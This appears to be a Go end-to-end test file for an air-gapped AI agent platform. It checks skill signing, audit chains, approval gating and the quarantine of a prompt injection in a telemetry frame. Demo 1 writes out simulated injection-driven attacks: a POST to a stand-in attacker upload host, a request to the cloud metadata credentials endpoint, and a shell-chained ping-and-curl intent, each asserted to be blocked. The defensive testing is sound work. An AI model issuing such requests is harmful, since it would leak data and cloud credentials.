// Copyright (c) 2026 Vraxter. All rights reserved.
//
// This file is part of Vraxter.
// Vraxter is free software licensed under the GNU Affero General Public License (AGPL) v3.0.
// See the LICENSE file in the project root for full license information.
//
// For commercial licensing inquiries, contact Vraxter.

package demos_test

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/vraxter/vraxter/internal/audit"
	"github.com/vraxter/vraxter/internal/core"
	"github.com/vraxter/vraxter/internal/db"
	"github.com/vraxter/vraxter/internal/llm"
	"github.com/vraxter/vraxter/internal/security"
	"github.com/vraxter/vraxter/internal/services"
	"github.com/vraxter/vraxter/internal/skills"
	"github.com/vraxter/vraxter/internal/telemetry"
	"github.com/vraxter/vraxter/internal/utils"
	"github.com/vraxter/vraxter/pkg/types"
)

func compileOfflineWASISkill(t *testing.T, skillSrcDir, outWASMPath string) {
	t.Helper()
	goBin, err := exec.LookPath("go")
	if err != nil {
		t.Fatalf("go compiler not found in PATH: %v", err)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, goBin, "build", "-ldflags=-s -w", "-o", outWASMPath, ".")
	cmd.Dir = skillSrcDir
	cmd.Env = append(os.Environ(),
		"GOOS=wasip1",
		"GOARCH=wasm",
		"GOPROXY=off",
		"CGO_ENABLED=0",
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("offline GOPROXY=off wasip1 build failed for %s: %v\noutput: %s", skillSrcDir, err, string(out))
	}
}

func TestDemo01_AerospaceTelemetryAirgapE2E(t *testing.T) {
	workDir := t.TempDir()
	keysDir := filepath.Join(workDir, "keys")
	trustedDir := filepath.Join(workDir, "trusted_signers")
	stagingDir := filepath.Join(workDir, "staging")
	skillsDir := filepath.Join(workDir, "skills")
	for _, d := range []string{keysDir, trustedDir, stagingDir, skillsDir} {
		if err := os.MkdirAll(d, 0700); err != nil {
			t.Fatalf("MkdirAll(%s): %v", d, err)
		}
	}

	demoDir := filepath.Join("01-aerospace-telemetry-airgap")
	skillSrcDir := filepath.Join(demoDir, "skill")
	srcManifestPath := filepath.Join(demoDir, "manifest.json")
	absDemoDir, err := filepath.Abs(demoDir)
	if err != nil {
		t.Fatalf("filepath.Abs(%s): %v", demoDir, err)
	}

	// 1. Compile vrx-telemetry-analyzer 100% offline (GOPROXY=off, GOOS=wasip1, GOARCH=wasm)
	wasmPath := filepath.Join(stagingDir, "vrx-telemetry-analyzer.wasm")
	compileOfflineWASISkill(t, skillSrcDir, wasmPath)

	manifestBytes, err := os.ReadFile(srcManifestPath)
	if err != nil {
		t.Fatalf("read Demo 1 manifest.json: %v", err)
	}
	stagedManifestPath := filepath.Join(stagingDir, "manifest.json")
	if err := os.WriteFile(stagedManifestPath, manifestBytes, 0600); err != nil {
		t.Fatalf("write staged manifest.json: %v", err)
	}

	// 2. Generate Ed25519 Root Signer keypair, register in trusted_signers/ as Tier1Official, and sign skill
	kp, err := security.GenerateEd25519KeyPair("Vraxter Root Signer")
	if err != nil {
		t.Fatalf("GenerateEd25519KeyPair: %v", err)
	}
	privPath, pubPath, err := security.WriteEd25519KeyPairFiles(keysDir, "vraxter_root_signer", kp)
	if err != nil {
		t.Fatalf("WriteEd25519KeyPairFiles: %v", err)
	}
	pubKey, _, err := security.LoadEd25519PublicKey(pubPath)
	if err != nil {
		t.Fatalf("LoadEd25519PublicKey: %v", err)
	}
	trustStore := security.NewTrustedSignerStore(trustedDir)
	if _, _, err := trustStore.AddSigner(pubKey, "Vraxter Root Signer", types.Tier1Official); err != nil {
		t.Fatalf("AddSigner: %v", err)
	}

	sigPath := filepath.Join(stagingDir, "vrx-telemetry-analyzer.sig")
	if _, err := security.SignSkillFiles(wasmPath, stagedManifestPath, privPath, sigPath, "Vraxter Root Signer"); err != nil {
		t.Fatalf("SignSkillFiles: %v", err)
	}

	// 3. Enforce strict --airgap perimeter, zero-egress local telemetry, and EncryptAtRest SQLite DB
	utils.InstallAirgapPerimeter("airgap", nil)
	defer utils.InstallAirgapPerimeter("hybrid", nil)

	otelProvider, err := telemetry.Configure(telemetry.Config{
		IsolationMode: "airgap",
		JSONLPath:     filepath.Join(workDir, "spans.jsonl"),
	})
	if err != nil {
		t.Fatalf("telemetry.Configure(airgap): %v", err)
	}

	dbPath := filepath.Join(workDir, "vraxter.db")
	store, err := db.NewStoreWithOptions(dbPath, db.StoreOptions{
		EncryptAtRest: true,
	})
	if err != nil {
		t.Fatalf("db.NewStoreWithOptions(EncryptAtRest=true): %v", err)
	}

	auditJSONL := filepath.Join(workDir, "audit_live.jsonl")
	ledger, err := audit.NewLedger(store, workDir, auditJSONL)
	if err != nil {
		store.Close()
		t.Fatalf("audit.NewLedger: %v", err)
	}
	audit.SetDefaultLedger(ledger)
	defer audit.SetDefaultLedger(nil)

	// 4. Register signed skill with require_signed_skills: true
	skillRepo := db.NewSkillRepository(store)
	skillSvc := services.NewSkillService(skillRepo, skillsDir)
	skillSvc.SetTrustedSignersDir(trustedDir)
	skillSvc.SetRequireSignedSkills(true)

	installed, err := skillSvc.RegisterFromWASM(wasmPath, stagedManifestPath)
	if err != nil {
		store.Close()
		t.Fatalf("RegisterFromWASM failed for signed Demo 1 skill: %v", err)
	}
	if installed.Tier != types.Tier1Official || !installed.IsOfficial {
		store.Close()
		t.Fatalf("expected Tier1Official and IsOfficial=true, got tier=%d official=%v", installed.Tier, installed.IsOfficial)
	}

	reg := skills.NewRegistry()
	_ = reg.Register(installed)

	runner := skills.NewRunner()
	runner.SetNetworkPolicy("airgap", nil)
	runner.SetTrustedSignersDir(trustedDir)
	runner.SetRequireSignedSkills(true)
	runner.SetAuditLedger(ledger)

	cryptoSvc, err := security.NewCryptoService(filepath.Join(workDir, ".masterkey"))
	if err != nil {
		store.Close()
		t.Fatalf("NewCryptoService: %v", err)
	}
	orch, err := core.NewOrchestrator(store, cryptoSvc, reg, runner, nil, nil, false, nil, false, "airgap", nil)
	if err != nil {
		store.Close()
		t.Fatalf("NewOrchestrator: %v", err)
	}
	orch.SetAuditLedger(ledger)

	// Configure HostExecGuard in airgap mode with a mock allowlisted ping binary
	mockPing := filepath.Join(workDir, "mock-ping.exe")
	_ = os.WriteFile(mockPing, []byte("mock-ping-binary"), 0700)
	pSum := sha256.Sum256([]byte("mock-ping-binary"))
	cmdsFile := filepath.Join(workDir, "host_commands.json")
	cmdsRaw, _ := json.Marshal(security.HostCommandsManifest{
		Commands: map[string]security.HostCommandSpec{
			"ping": {Path: mockPing, SHA256: hex.EncodeToString(pSum[:]), Tier: security.HostCommandTierReadOnly},
		},
	})
	_ = os.WriteFile(cmdsFile, cmdsRaw, 0600)
	orch.ExecEngine.HostExecGuard = security.NewHostExecGuard(security.HostExecOptions{
		Enabled:       true,
		CommandsFile:  cmdsFile,
		IsolationMode: "airgap",
	})

	// 5. Execute signed telemetry analyzer on telemetry_batch.jsonl via Runner (read-only /input mount)
	ctx, traceID, rootSpan := telemetry.EnsureTraceID(context.Background(), "demo01.AerospaceEnclave")
	ctx = audit.WithSessionID(ctx, "demo01-flight-session")
	ctx = audit.WithActor(ctx, "specialist:Telemetry_Flight_Engineer")

	_, _ = ledger.Append(ctx, audit.AuditEventInput{
		EventType: audit.EventRequestReceived,
		Payload: map[string]interface{}{
			"demo":           "01-aerospace-telemetry-airgap",
			"isolation_mode": "airgap",
			"dataset":        "telemetry_batch.jsonl",
		},
	})

	execRes, err := runner.Execute(ctx, installed, map[string]interface{}{
		"_input_dir": absDemoDir,
		"file":       "/input/telemetry_batch.jsonl",
	})
	if err != nil {
		store.Close()
		t.Fatalf("Demo 1 signed WASI execution failed: %v", err)
	}

	var parsedReport struct {
		Verdict                string `json:"verdict"`
		FramesAnalyzed         int    `json:"frames_analyzed"`
		MaxEGTC                float64 `json:"max_egt_c"`
		MaxVibrationG          float64 `json:"max_vibration_g"`
		Anomalies              []map[string]interface{} `json:"anomalies"`
		PromptInjectionBlocked []string `json:"prompt_injection_signals_quarantined"`
	}
	if err := json.Unmarshal([]byte(execRes.Output), &parsedReport); err != nil {
		store.Close()
		t.Fatalf("failed unmarshaling Demo 1 report JSON (%q): %v", execRes.Output, err)
	}

	if parsedReport.Verdict != "CRITICAL_TURBINE_ANOMALY_DETECTED" {
		store.Close()
		t.Fatalf("expected CRITICAL_TURBINE_ANOMALY_DETECTED, got %q", parsedReport.Verdict)
	}
	if parsedReport.FramesAnalyzed != 12 || len(parsedReport.Anomalies) != 3 {
		store.Close()
		t.Fatalf("expected 12 frames and 3 critical anomaly frames (T-0007..T-0009), got frames=%d anomalies=%d", parsedReport.FramesAnalyzed, len(parsedReport.Anomalies))
	}
	if len(parsedReport.PromptInjectionBlocked) != 1 || parsedReport.PromptInjectionBlocked[0] != "T-0008" {
		store.Close()
		t.Fatalf("expected prompt injection in frame T-0008 to be quarantined, got %v", parsedReport.PromptInjectionBlocked)
	}

	// 6. Simulate adversarial follow-on attempts derived from T-0008 prompt injection:
	//    (a) HTTP exfiltration to https://exfil.attacker.example.com/upload & IMDS 169.254.169.254
	ddilClient := utils.NewDDILHTTPClient()
	for _, exfilURL := range []string{
		"https://exfil.attacker.example.com/upload",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
	} {
		reqCtx, cancel := context.WithTimeout(ctx, 250*time.Millisecond)
		req, _ := http.NewRequestWithContext(reqCtx, http.MethodPost, exfilURL, strings.NewReader(execRes.Output))
		resp, doErr := ddilClient.Do(req)
		cancel()
		if doErr == nil {
			_ = resp.Body.Close()
			store.Close()
			t.Fatalf("CRITICAL: airgap perimeter failed to block prompt-injected exfil to %s", exfilURL)
		}
		_, _ = ledger.Append(ctx, audit.AuditEventInput{
			EventType: audit.EventPolicyEvaluated,
			Payload: map[string]interface{}{
				"check":    "airgap_http_egress",
				"target":   exfilURL,
				"decision": "DENY",
				"reason":   doErr.Error(),
			},
		})
	}

	//    (b) Shell injection & WAN ping command through Orchestrator ($)
	hostStream, err := orch.ProcessRawIntent(ctx, "demo01-flight-session", "$ ping 8.8.8.8 && curl http://169.254.169.254/latest/meta-data/", "", "", "", "operator")
	if err != nil {
		store.Close()
		t.Fatalf("ProcessRawIntent for blocked host cmd: %v", err)
	}
	var hostOut strings.Builder
	for ev := range hostStream {
		if ev.Type == llm.EventTypeToken {
			hostOut.WriteString(ev.Content)
		}
	}
	if !strings.Contains(hostOut.String(), "Host command denied") {
		store.Close()
		t.Fatalf("expected shell-injected host command to be denied, got: %q", hostOut.String())
	}

	_, _ = ledger.Append(ctx, audit.AuditEventInput{
		EventType: audit.EventResponseEmitted,
		Payload: map[string]interface{}{
			"verdict":  parsedReport.Verdict,
			"trace_id": traceID,
			"status":   "completed",
		},
	})
	rootSpan.End()

	// 7. Verify zero network egress, cryptographic audit chain integrity, and verifiable JSONL export
	if otelProvider.NetworkEgressCount() != 0 {
		store.Close()
		t.Fatalf("expected NetworkEgressCount() == 0, got %d", otelProvider.NetworkEgressCount())
	}

	verifiedCount, err := ledger.VerifyChain()
	if err != nil {
		store.Close()
		t.Fatalf("Demo 1 VerifyChain() failed: %v", err)
	}
	if verifiedCount < 7 {
		store.Close()
		t.Fatalf("expected >= 7 chained audit entries in Demo 1, got %d", verifiedCount)
	}

	exportPath := filepath.Join(workDir, "audit_export.jsonl")
	exportedCount, err := ledger.ExportJSONL(exportPath, audit.ExportFilter{})
	if err != nil || exportedCount != verifiedCount {
		store.Close()
		t.Fatalf("Demo 1 ExportJSONL failed: exported=%d expected=%d err=%v", exportedCount, verifiedCount, err)
	}
	if offlineCount, err := audit.VerifyJSONLFile(exportPath, nil); err != nil || offlineCount != verifiedCount {
		store.Close()
		t.Fatalf("Demo 1 offline VerifyJSONLFile failed: count=%d err=%v", offlineCount, err)
	}

	// 8. Close EncryptAtRest SQLite store and confirm zero plaintext .db remains on disk
	if err := store.Close(); err != nil {
		t.Fatalf("store.Close() sealing failed: %v", err)
	}
	if _, err := os.Stat(dbPath); !os.IsNotExist(err) {
		t.Fatalf("expected plaintext %s to be removed after EncryptAtRest Close()", dbPath)
	}
	if _, err := os.Stat(dbPath + ".enc"); err != nil {
		t.Fatalf("expected sealed %s.enc on disk after Close(): %v", dbPath, err)
	}

	t.Logf("[Demo 1 Aerospace Air-Gap E2E] Verdict=%s Frames=%d Anomalies=%d PromptInjectionQuarantined=%v AuditVerified=%d OTelEgress=0 SealedDB=OK",
		parsedReport.Verdict, parsedReport.FramesAnalyzed, len(parsedReport.Anomalies), parsedReport.PromptInjectionBlocked, verifiedCount)
}

func TestDemo02_SovereignSOCTriageE2E(t *testing.T) {
	workDir := t.TempDir()
	keysDir := filepath.Join(workDir, "keys")
	trustedDir := filepath.Join(workDir, "trusted_signers")
	stagingDir := filepath.Join(workDir, "staging")
	skillsDir := filepath.Join(workDir, "skills")
	for _, d := range []string{keysDir, trustedDir, stagingDir, skillsDir} {
		if err := os.MkdirAll(d, 0700); err != nil {
			t.Fatalf("MkdirAll(%s): %v", d, err)
		}
	}

	demoDir := filepath.Join("02-sovereign-soc-triage")
	skillSrcDir := filepath.Join(demoDir, "skill")
	srcManifestPath := filepath.Join(demoDir, "manifest.json")
	absDemoDir, err := filepath.Abs(demoDir)
	if err != nil {
		t.Fatalf("filepath.Abs(%s): %v", demoDir, err)
	}

	// 1. Activate local_lan isolation mode (zero WAN egress)
	utils.InstallAirgapPerimeter("local_lan", nil)
	defer utils.InstallAirgapPerimeter("hybrid", nil)

	otelProvider, err := telemetry.Configure(telemetry.Config{
		IsolationMode: "local_lan",
		JSONLPath:     filepath.Join(workDir, "soc_spans.jsonl"),
	})
	if err != nil {
		t.Fatalf("telemetry.Configure(local_lan): %v", err)
	}

	// 2. Compile vrx-soc-triage 100% offline (GOPROXY=off) and verify static WASM imports
	wasmPath := filepath.Join(stagingDir, "vrx-soc-triage.wasm")
	compileOfflineWASISkill(t, skillSrcDir, wasmPath)

	manifestBytes, err := os.ReadFile(srcManifestPath)
	if err != nil {
		t.Fatalf("read Demo 2 manifest.json: %v", err)
	}
	stagedManifestPath := filepath.Join(stagingDir, "manifest.json")
	if err := os.WriteFile(stagedManifestPath, manifestBytes, 0600); err != nil {
		t.Fatalf("write staged manifest.json: %v", err)
	}

	var v1 types.SkillManifestV1
	if err := json.Unmarshal(manifestBytes, &v1); err != nil {
		t.Fatalf("unmarshal Demo 2 manifest: %v", err)
	}
	if err := skills.VerifyWASMFile(context.Background(), wasmPath, v1.ToLegacyManifest()); err != nil {
		t.Fatalf("Demo 2 static WASM import verification failed: %v", err)
	}

	// 3. Sign with Ed25519 and register in SkillService (require_signed_skills: true)
	kp, err := security.GenerateEd25519KeyPair("Vraxter SOC Root Signer")
	if err != nil {
		t.Fatalf("GenerateEd25519KeyPair: %v", err)
	}
	privPath, pubPath, err := security.WriteEd25519KeyPairFiles(keysDir, "vraxter_soc_signer", kp)
	if err != nil {
		t.Fatalf("WriteEd25519KeyPairFiles: %v", err)
	}
	pubKey, _, err := security.LoadEd25519PublicKey(pubPath)
	if err != nil {
		t.Fatalf("LoadEd25519PublicKey: %v", err)
	}
	trustStore := security.NewTrustedSignerStore(trustedDir)
	if _, _, err := trustStore.AddSigner(pubKey, "Vraxter SOC Root Signer", types.Tier1Official); err != nil {
		t.Fatalf("AddSigner: %v", err)
	}
	sigPath := filepath.Join(stagingDir, "vrx-soc-triage.sig")
	if _, err := security.SignSkillFiles(wasmPath, stagedManifestPath, privPath, sigPath, "Vraxter SOC Root Signer"); err != nil {
		t.Fatalf("SignSkillFiles: %v", err)
	}

	store, err := db.NewStore(filepath.Join(workDir, "soc.db"))
	if err != nil {
		t.Fatalf("db.NewStore: %v", err)
	}
	defer store.Close()

	ledger, err := audit.NewLedger(store, workDir, filepath.Join(workDir, "soc_audit.jsonl"))
	if err != nil {
		t.Fatalf("audit.NewLedger: %v", err)
	}
	audit.SetDefaultLedger(ledger)
	defer audit.SetDefaultLedger(nil)

	skillRepo := db.NewSkillRepository(store)
	skillSvc := services.NewSkillService(skillRepo, skillsDir)
	skillSvc.SetTrustedSignersDir(trustedDir)
	skillSvc.SetRequireSignedSkills(true)

	installed, err := skillSvc.RegisterFromWASM(wasmPath, stagedManifestPath)
	if err != nil {
		t.Fatalf("RegisterFromWASM Demo 2 failed: %v", err)
	}

	reg := skills.NewRegistry()
	_ = reg.Register(installed)

	runner := skills.NewRunner()
	runner.SetNetworkPolicy("local_lan", nil)
	runner.SetTrustedSignersDir(trustedDir)
	runner.SetRequireSignedSkills(true)
	runner.SetAuditLedger(ledger)

	cryptoSvc, err := security.NewCryptoService(filepath.Join(workDir, ".masterkey"))
	if err != nil {
		t.Fatalf("NewCryptoService: %v", err)
	}
	orch, err := core.NewOrchestrator(store, cryptoSvc, reg, runner, nil, nil, false, nil, false, "local_lan", nil)
	if err != nil {
		t.Fatalf("NewOrchestrator: %v", err)
	}
	orch.SetAuditLedger(ledger)

	ctx, _, span := telemetry.EnsureTraceID(context.Background(), "demo02.SovereignSOC")
	defer span.End()

	// 4. First invocation: !vrx-soc-triage MUST pause at the HITL Decision Bridge (approval: "always")
	stream1, err := orch.ProcessRawIntent(ctx, "demo02-soc-session", "!vrx-soc-triage", "", "", "", "soc_analyst")
	if err != nil {
		t.Fatalf("ProcessRawIntent(!vrx-soc-triage) failed: %v", err)
	}
	sawApprovalRequest := false
	for ev := range stream1 {
		if ev.Type == llm.EventTypeSkillApprovalRequest && ev.SkillID == "vrx-soc-triage" {
			sawApprovalRequest = true
		}
	}
	if !sawApprovalRequest {
		t.Fatalf("Demo 2 FAILED: expected vrx-soc-triage (approval: always) to hold at HITL Decision Bridge with EventTypeSkillApprovalRequest")
	}

	// Verify HITL_DECISION: REQUESTED was recorded and NO WASM_EXEC_START occurred prior to approval
	preEntries, err := ledger.ListEntries(audit.ExportFilter{})
	if err != nil {
		t.Fatalf("ListEntries pre-approval: %v", err)
	}
	foundRequested := false
	for _, e := range preEntries {
		if e.EventType == audit.EventWASMExecStart {
			t.Fatalf("Demo 2 SECURITY VIOLATION: WASM execution started before human HITL approval!")
		}
		if e.EventType == audit.EventHITLDecision && strings.Contains(e.PayloadJSON, `"decision":"REQUESTED"`) {
			foundRequested = true
		}
	}
	if !foundRequested {
		t.Fatalf("Demo 2 FAILED: expected HITL_DECISION REQUESTED in audit_ledger before approval")
	}

	// 5. Explicit human operator approval via !APPROVE_SKILL control command
	approveCall := types.ToolCall{
		SkillID: "vrx-soc-triage",
		Params: map[string]interface{}{
			"_input_dir": absDemoDir,
			"file":       "/input/lan_incident_events.jsonl",
		},
	}
	approveBytes, _ := json.Marshal(approveCall)
	stream2, err := orch.ProcessRawIntent(ctx, "demo02-soc-session", "!APPROVE_SKILL "+string(approveBytes), "", "", "", "soc_operator")
	if err != nil {
		t.Fatalf("ProcessRawIntent(!APPROVE_SKILL) failed: %v", err)
	}
	var approvedOut strings.Builder
	for ev := range stream2 {
		if ev.Type == llm.EventTypeToken {
			approvedOut.WriteString(ev.Content)
		}
	}

	outputStr := approvedOut.String()
	if !strings.Contains(outputStr, "10.20.0.99") {
		t.Fatalf("Demo 2 expected attacker IOC 10.20.0.99 in triage output, got: %s", outputStr)
	}
	if !strings.Contains(outputStr, "nft add rule inet vraxter_soc input ip saddr 10.20.0.99 counter drop") {
		t.Fatalf("Demo 2 expected proposed nftables drop rule in output, got: %s", outputStr)
	}
	if !strings.Contains(outputStr, "rule Vraxter_SOC_IsolatedLAN_Beacon_Stage2") {
		t.Fatalf("Demo 2 expected proposed YARA rule in output, got: %s", outputStr)
	}

	// 6. Verify complete causal audit trail and zero WAN egress
	if otelProvider.NetworkEgressCount() != 0 {
		t.Fatalf("expected NetworkEgressCount() == 0 in local_lan mode, got %d", otelProvider.NetworkEgressCount())
	}

	verifiedCount, err := ledger.VerifyChain()
	if err != nil {
		t.Fatalf("Demo 2 VerifyChain() failed: %v", err)
	}

	allEntries, err := ledger.ListEntries(audit.ExportFilter{})
	if err != nil {
		t.Fatalf("ListEntries post-approval: %v", err)
	}
	var sawReq, sawHitlReq, sawHitlApp, sawPolicy, sawWasmStart, sawWasmEnd, sawResp bool
	for _, e := range allEntries {
		switch e.EventType {
		case audit.EventRequestReceived:
			sawReq = true
		case audit.EventHITLDecision:
			if strings.Contains(e.PayloadJSON, `"decision":"REQUESTED"`) {
				sawHitlReq = true
			}
			if strings.Contains(e.PayloadJSON, `"decision":"APPROVED"`) {
				sawHitlApp = true
			}
		case audit.EventPolicyEvaluated:
			sawPolicy = true
		case audit.EventWASMExecStart:
			sawWasmStart = true
		case audit.EventWASMExecEnd:
			sawWasmEnd = true
		case audit.EventResponseEmitted:
			sawResp = true
		}
	}
	if !sawReq || !sawHitlReq || !sawHitlApp || !sawPolicy || !sawWasmStart || !sawWasmEnd || !sawResp {
		t.Fatalf("Demo 2 missing causal audit events: req=%v hitlReq=%v hitlApp=%v policy=%v wasmStart=%v wasmEnd=%v resp=%v",
			sawReq, sawHitlReq, sawHitlApp, sawPolicy, sawWasmStart, sawWasmEnd, sawResp)
	}

	t.Logf("[Demo 2 Sovereign SOC Triage E2E] IOC=10.20.0.99 NFTables+YARA=Proposed HITL=REQUESTED->APPROVED AuditVerified=%d OTelEgress=0", verifiedCount)
}
